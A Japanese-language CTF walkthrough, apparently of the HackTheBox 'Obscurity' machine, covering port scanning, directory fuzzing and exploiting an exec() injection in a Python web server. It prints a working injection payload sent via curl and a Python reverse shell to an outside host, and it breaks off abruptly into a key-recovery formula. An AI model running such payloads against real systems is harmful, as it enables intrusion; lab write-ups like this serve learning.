偵察


このマシンのIPアドレスは10.10.10.168で、/ etc / hostsに追加しています。

10.10.10.168    obscurity.htb

まず、開いているポートをスキャンします。nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。tun0インターフェースからすべてのTCPおよびUDPポートを毎秒500パケットの速度でスキャンします。

masscan -e tun0 -p1-65535,U:1-65535 10.10.10.168 --rate=500



ここで、ポートで動作するサービスの詳細については、-Aオプションを指定してスキャンを実行します。

nmap -A obscurity.htb -p22,8080



ホストはSSHサービスとWebサーバーを実行します。私たちはウェブを見に行きます。



したがって、次のようになります。

  1. 記録サーバー
  2. 使用される暗号化
  3. 不明なディレクトリにあるSuperSecureServer.pyファイルのサーバーコード。

ファイルの名前がわかっているので、ディレクトリを調べてみましょう。wfuzzでやりましょう。パラメータとして、無視される辞書、URL、応答コードを渡します。

wfuzz -w /usr/share/dirb/wordlists/common.txt -u http://obscurity.htb:8080/FUZZ/SuperSecureServer.py --hc 404



そして、このディレクトリを見つけます。サーバーコードをダウンロードしましょう。

wget http://obscurity.htb:8080/develop/SuperSecureServer.py

エントリーポイント


サーバーを開いて分析します。exec（）関数の潜在的に危険な使用法を見つけました。



コードにいくつかの行を追加しましょう。



そのため、サーバーをローカルで起動して、exec（）関数に何が入るかを確認できます。サーバーを起動してリクエストを送信しましょう。

curl http://127.0.0.1:33333/asd



curl "http://127.0.0.1:33333/asd'"



curl "http://127.0.0.1:33333/asd''"



したがって、OSコマンドインジェクションがあります。

curl "http://127.0.0.1:33333/asd';os.system(\"whoami\");'"



次のリバースPythonシェルを使用します。

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.15.60",4321));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

サーバーコードにはすでに必要なモジュールのインポートが含まれているため、それらのインポートをシェルから削除します。引用符と角括弧もエスケープします。

curl "http://127.0.0.1:33333/asd';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.60\",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);'"



いいね！すべてがローカルマシンで動作します。このリクエストをサーバーに実行してみましょう。

つまり、（[check.txt] + [key]）％255 = out.txtおよび（[out.txt]-[key]）％255 = check.txtです。次に（[out.txt]-[check.txt]）％255 = key。
